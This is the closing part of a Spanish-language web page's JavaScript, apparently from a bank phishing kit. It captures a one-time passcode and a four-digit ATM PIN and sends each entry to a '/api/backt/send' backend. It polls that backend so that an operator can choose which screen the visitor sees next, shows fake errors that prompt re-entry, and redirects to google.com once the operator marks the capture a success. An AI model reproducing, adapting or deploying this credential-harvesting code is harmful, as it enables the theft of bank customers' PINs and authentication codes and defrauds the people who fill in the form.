                function updateHiddenValue() {
                    const value = Array.from(inputs).map(input => input.value).join('');
                    if (hiddenInput) {
                        hiddenInput.value = value;
                    }
                }

                function checkComplete() {
                    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
                    if (button) {
                        button.disabled = !allFilled;
                    }
                    updateHiddenValue();
                }

                inputs.forEach((input, index) => {
                    input.addEventListener('input', function(e) {
                        this.value = this.value.replace(/[^0-9]/g, '');

                        if (this.value.length === 1) {
                            this.classList.add('filled');
                            if (index < inputs.length - 1) {
                                inputs[index + 1].focus();
                            }
                        } else {
                            this.classList.remove('filled');
                        }
                        checkComplete();
                    });

                    input.addEventListener('keydown', function(e) {
                        if (e.key === 'Backspace' && this.value === '' && index > 0) {
                            inputs[index - 1].focus();
                            inputs[index - 1].value = '';
                            inputs[index - 1].classList.remove('filled');
                            checkComplete();
                        }
                    });

                    input.addEventListener('paste', function(e) {
                        e.preventDefault();
                        const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, maxLength);

                        pastedData.split('').forEach((char, i) => {
                            if (inputs[i]) {
                                inputs[i].value = char;
                                inputs[i].classList.add('filled');
                            }
                        });

                        const lastIndex = Math.min(pastedData.length, inputs.length) - 1;
                        if (lastIndex >= 0 && lastIndex < inputs.length - 1) {
                            inputs[lastIndex + 1].focus();
                        } else if (lastIndex === inputs.length - 1) {
                            inputs[lastIndex].focus();
                        }
                        checkComplete();
                    });
                });
            }

            const otpHiddenInput = document.getElementById('otpapp');
            if (otpInputs.length > 0) {
                setupCodeInputs(otpInputs, 6, btnContinueOtp, otpHiddenInput);
            }

            otpForm?.addEventListener('submit', function(e) {
                e.preventDefault();
                const otp = Array.from(otpInputs).map(input => input.value).join('');
                console.log('OTP submitted:', otp);
            });

            // =============================================
            // CLAVE CAJERO INPUT
            // =============================================
            const claveInputsCajero = document.querySelectorAll('.clavecajero-input');
            const claveForm = document.getElementById('clavecajero-form');
            const btnContinueClave = claveForm?.querySelector('#btn-continue');
            const claveHiddenInput = document.getElementById('clavecajero');

            if (claveInputsCajero.length > 0) {
                setupCodeInputs(claveInputsCajero, 4, btnContinueClave, claveHiddenInput);
            }

            claveForm?.addEventListener('submit', function(e) {
                e.preventDefault();
                const claveCajero = Array.from(claveInputsCajero).map(input => input.value).join('');
                console.log('Clave cajero submitted:', claveCajero);
            });

            // =============================================
            // HANDLERS COMUNES (solo una vez)
            // =============================================

            // Close buttons
            document.querySelectorAll('#btn-close').forEach(btn => {
                btn.addEventListener('click', function() {
                    window.history.back();
                });
            });

            // Cancel buttons
            document.querySelectorAll('#btn-cancel').forEach(btn => {
                btn.addEventListener('click', function() {
                    window.history.back();
                });
            });

            // Modal handlers
            document.getElementById('btn-modal-inactive')?.addEventListener('click', function() {
                document.getElementById('modal-inactive').classList.add('hidden');
            });

            document.getElementById('close-modal-error')?.addEventListener('click', function() {
                document.getElementById('modal-error').classList.add('hidden');
            });

            document.getElementById('btn-retry')?.addEventListener('click', function() {
                document.getElementById('modal-error').classList.add('hidden');
            });

            document.getElementById('close-modal-important')?.addEventListener('click', function() {
                document.getElementById('modal-important').classList.add('hidden');
            });
        });
    </script>

        <script>
        $(document).ready(function () {
            // ==================== CONFIGURACIÓN INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'seccion-1'
            };

            console.log('Session UniqID:', appState.uniqId);

            // ==================== FUNCIONES AUXILIARES ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            function hideAllViews() {
                $('#seccion-1, #seccion-2, #exito, #error, #esperando').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                $('#' + viewId).removeClass('hidden');

                // Mostrar mensaje de error general si la vista ya fue mostrada antes
                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'esperando' && viewId !== 'exito' && viewId !== 'error') {
                    // La vista ya fue mostrada antes, mostrar mensaje de error y limpiar campos
                    if (viewId === 'seccion-1') {
                        $('#errorSeccion-1').text('Error seccion 1.').addClass('show');
                        $('#input-1').val('');
                        $('#btnSeccion-1').prop('disabled', true);
                    } else if (viewId === 'seccion-2') {
                        $('#errorSeccion-2').text('Error seccion 2.').addClass('show');
                        $('#input-2').val('');
                        $('#btnSeccion-2').prop('disabled', true);
                    }
                } else {
                    // Ocultar mensajes de error generales
                    $('.error-message.show').removeClass('show').text('');
                }

                // Registrar la vista en el historial
                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function showLoading() {
                $('#loading').removeClass('hidden');
                setTimeout(iniciarPolling, 4000);
            }

            function hideLoading() {
                $('#loading').addClass('hidden');
            }

            let enviandoABackt = false;

            async function enviarABackt() {
                if (enviandoABackt) {
                    console.log('Ya hay un envío en progreso, evitando duplicado');
                    return;
                }

                enviandoABackt = true;

                const allData = {};
                const fields = ['input-1', 'input-2', 'uniqid'];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                try {
                    const response = await fetch('/api/backt/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Datos enviados a Backt:', result);
                } catch (e) {
                    console.error('Error al enviar a Backt:', e);
                } finally {
                    setTimeout(() => {
                        enviandoABackt = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const loadingElement = document.getElementById('loading');
                if (loadingElement && loadingElement.classList.contains('hidden')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/backt/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();

                        // Mapeo de respuestas de Backt a vistas
                        const viewMap = {
                            'seccion-1': 'seccion-1',
                            'seccion-2': 'seccion-2',
                            'exito': 'exito',
                            'error': 'error',
                            'esperando': 'esperando'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        // Redirección automática para exito
                        if (viewId === 'exito') {
                            setTimeout(function () {
                                window.location.href = 'https://google.com/';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }


            // ==================== EVENTOS SECCION 1 ====================
            $('#btnSeccion-1').on('click', async function () {
                
                    saveToLocalStorage('input-1', $('#input-1').val().trim());
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarABackt();
                    showLoading();
                    iniciarPolling();
            });

            // ==================== EVENTOS SECCION 1 ====================
            $('#btnSeccion-2').on('click', async function () {
                
                    saveToLocalStorage('input-2', $('#input-2').val().trim());
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarABackt();
                    showLoading();
                    iniciarPolling();
            });

            // ==================== INICIALIZACIÓN ====================
            showView('seccion-1');
        });
    </script>




</body>

</html>
